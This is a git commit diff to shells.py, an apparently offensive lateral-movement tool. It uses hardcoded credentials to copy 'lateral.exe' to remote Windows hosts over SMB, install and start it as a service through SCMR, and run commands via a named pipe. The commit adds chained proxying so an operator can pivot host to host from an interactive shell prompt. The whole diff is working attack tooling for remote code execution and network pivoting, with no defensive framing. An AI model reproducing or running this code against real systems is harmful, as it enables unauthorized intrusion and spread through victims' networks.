c83be4efb9f9a67fb0b4afe0a827e8f4a28ecfe6
s0i37 <s0i37@work>
2021-05-15 13:08:18 +0500

    added chain browsing added moving along the chain fork model replaced by thread

--- shells.py
+++ shells.py
@@ -34,7 +34,6 @@ def delete():
 def start_service(target, creds, command, lmhash="", nthash=""):
 	ip, port = target
 	username, password, domain = creds
-	print(ip, username, password, command, domain, port)
 	aesKey = None
 	remoteName = ip
 	remoteHost = ip
@@ -57,8 +56,10 @@ def start_service(target, creds, command, lmhash="", nthash=""):
 	print("[*] creating")
 	ans = scmr.hROpenSCManagerW(rpc)
 	scManagerHandle = ans['lpScHandle']
-	scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00',
-                                  lpBinaryPathName=command + '\x00')
+	try:
+		scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00', lpBinaryPathName=command + '\x00')
+	except Exception as e:
+		print(str(e))
 
 	#start
 	print("[*] starting")
@@ -99,8 +100,8 @@ def stop_service(target, creds, lmhash="", nthash=""):
 	scmr.hRCloseServiceHandle(rpc, serviceHandle)
 
 def install_service(target, creds):
-	copy(target, creds, "msrpc/server.exe", "/windows/server.exe")
-	start_service(target, creds, "server.exe")
+	copy(target, creds, "msrpc/lateral.exe", "/windows/lateral.exe")
+	start_service(target, creds, "lateral.exe")
 
 
 
@@ -195,15 +196,16 @@ def execute(cmd, target, creds):
 	res = dce.request(execute)
 	return str(res["data"], "cp866")
 
-is_stop = False
+connections = {}
 def proxy(target_from, target_to, creds):
 	ip_from, port_from = target_from
 	ip_to, port_to = target_to
 	username, password, domain = creds
 	#print(target_from, target_to ,username, password, domain)
 
-	def incoming(c, sock):
-		global is_stop
+	def incoming(c, sock, target_from, creds, connect_id):
+		global connections
+		dce = msrpc(target_from, creds)
 		while True:
 			recv = Recv()
 			recv["socket"] = sock
@@ -213,20 +215,20 @@ def proxy(target_from, target_to, creds):
 			data = res[ 4 : unpack("<I", res[-4:])[0]+4 ]
 			if not data:
 				print("incoming closed")
-				is_stop = True
+				connections[connect_id] = True
 				break
 #			print("<-" + str(data) + "[" + str(len(data)) + "]")
 			c.send(data)
 			#print("incoming")
 
-	def outcoming(c, sock):
-		global is_stop
-		dce = msrpc((ip_from, port_from), (username, password, domain))
+	def outcoming(c, sock, target_from, creds, connect_id):
+		global connections
+		dce = msrpc(target_from, creds)
 		while True:
 			data = c.recv(1024)
-			if not data or is_stop:
+			if not data or connections[connect_id]:
 				print("outcoming closed")
-				is_stop = True
+				connections[connect_id] = True
 				break
 #			print("->" + str(data) + "[" + str(len(data)) + "]")
 			send = Send()
@@ -237,40 +239,47 @@ def proxy(target_from, target_to, creds):
 			#res.dump()
 			#print("outcoming")
 
+	def redirect(c, target_from, target_to, creds, connect_id):
+		ip_to, port_to = target_to
+
+		dce = msrpc(target_from, creds)
+		connect = Connect()
+		connect["ip"] = ip_to + "\x00"
+		connect["port"] = port_to
+		res = dce.request(connect, checkError=False)
+		#res.dump()
+		if res["socket"]:
+			connections[connect_id] = False
+			incoming_thr = Thread(target=incoming, args=(c, res["socket"], target_from, creds, connect_id))
+			outcoming_thr = Thread(target=outcoming, args=(c, res["socket"], target_from, creds, connect_id))
+			incoming_thr.start()
+			outcoming_thr.start()
+			while not connections[connect_id]:
+			    sleep(1)
+			#incoming_thr.join()
+			#outcoming_thr.join()
+
+			disconnect = Disconnect()
+			disconnect["socket"] = res["socket"]
+			res = dce.request(disconnect)
+			res.dump()
+
+	def serve(s, target_from, target_to, creds):
+		local_port = s.getsockname()[1]
+		while True:
+			c,info = s.accept()
+			connect_id=info[1]
+			redirect_thr = Thread(target=redirect, args=(c, target_from, target_to, creds, connect_id))
+			redirect_thr.start()
+			print(f"[*] proxying {info[0]}:{info[1]} -> {local_port}")
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	s.bind(('127.0.0.1', 0))
 	s.listen(10)
+	serve_thr = Thread(target=serve, args=(s, target_from, target_to, creds))
+	serve_thr.start()
 	local_port = s.getsockname()[1]
-	if fork() == 0:
-		while True:
-			c,info = s.accept()
-			if fork() == 0:
-				dce = msrpc((ip_from, port_from), (username, password, domain))
-				connect = Connect()
-				connect["ip"] = ip_to + "\x00"
-				connect["port"] = port_to
-				res = dce.request(connect, checkError=False)
-				#res.dump()
-				if res["socket"]:
-					is_stop = False
-					incoming_thr = Thread(target=incoming, args=(c,res["socket"]))
-					outcoming_thr = Thread(target=outcoming, args=(c,res["socket"]))
-					incoming_thr.start()
-					outcoming_thr.start()
-					while not is_stop:
-					    sleep(1)
-					#incoming_thr.join()
-					#outcoming_thr.join()
-
-					disconnect = Disconnect()
-					disconnect["socket"] = res["socket"]
-					res = dce.request(disconnect)
-					#res.dump()
-					exit()
-			else:
-				print(f"[*] proxying {info[0]}:{info[1]} -> {local_port}")
 	return local_port
 
 def check_pipe(target, creds):
@@ -290,30 +299,56 @@ def check_pipe(target, creds):
 	except Exception as e:
 		return False
 
+class Chain:
+	def __init__(self, ip, port):
+		self.next = []
+		self.prev = None
+		self.target = ip
+		self.target_port = port
+		self.target_ip = ip
+	def new(self, ip, port):
+		self.next.append( Chain(ip, port) )
+		self.next[-1].prev = self
+		self.next[-1].target_ip = "127.0.0.1"
+		return self.next[-1]
+
+def chain_get_root(the_chain):
+	while True:
+		if not the_chain.prev:
+			break
+		the_chain = the_chain.prev
+	return the_chain
+
+def chain_walk(the_chain, deep=0):
+	print(" "*deep + "`" + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
+	for the_chain in the_chain.next:
+		chain_walk(the_chain, deep+1)
+
 if __name__ == '__main__':
 	target = argv[1]
 	username = 'admin'
 	password = 'qwerty=123'
 	domain = '.'
-	ip = target
 	port = 445
-	proxy_chains = []
+	chain = Chain(target, 445)
 	while True:
-		line = input(f"{target}/> ")
+		line = input(f"{chain.target}/> ")
+		if not line:
+			continue
 		if line.startswith("shell "):
 			_,new_target = line.split(" ")
-			if not proxy_chains:
-				port = proxy((ip, 445), (new_target, 445), (username, password, domain))
-			else:
-				port = proxy(("127.0.0.1", proxy_chains[-1]), (new_target, 445), (username, password, domain))
-			proxy_chains.append(port)
-			print(str(proxy_chains))
-			target = new_target
-			ip = "127.0.0.1"
+			port = proxy((chain.target_ip, chain.target_port), (new_target, 445), (username, password, domain))
+			chain = chain.new(new_target, port)
+		elif line in ("show", "bt"):
+			chain_walk(chain_get_root(chain))
+		elif line in ("back",):
+			chain = chain.prev
+		elif line in ("goto ",):
+			pass
 		elif line in ('exit', 'quit', 'q'):
 			break
 		else:
 			cmd = line
-			if not check_pipe((ip, port), (username, password, domain)):
-				install_service((ip, port), (username, password, domain))
-			print( execute(cmd, (ip, port), (username, password, domain)) )
+			if not check_pipe((chain.target_ip, chain.target_port), (username, password, domain)):
+				install_service((chains.target_ip, chain.target_port), (username, password, domain))
+			print( execute(cmd, (chain.target_ip, chain.target_port), (username, password, domain)) )
